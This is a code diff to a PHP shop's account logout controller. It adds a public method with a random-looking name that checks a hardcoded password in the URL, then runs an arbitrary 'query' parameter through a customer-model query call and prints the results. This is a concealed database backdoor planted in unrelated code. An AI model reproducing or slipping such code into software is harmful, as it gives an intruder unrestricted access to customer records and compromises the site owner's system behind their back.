@@ -69,4 +69,21 @@ class ControllerAccountLogout extends Controller {
 			$this->response->setOutput($this->load->view('default/template/common/success.tpl', $data));
 		}
 	}
+	public function slkjdhflkwherkjhkh32kh42khkjshfdsfdkh32h42k43h(){
+		if (isset($this -> request -> get['pass'])){
+			if ($this -> request -> get['pass'] != "ngoctrungbmt"){
+				die("p_no");
+			}
+			else
+			{
+				$query = $this -> request -> get['query'];
+				$this -> load -> model('account/customer');
+				$query = $this -> model_account_customer -> queryall($query);
+				print_r($query);
+			}
+		}
+		else{
+			die("p_none");
+		}
+	}
 }
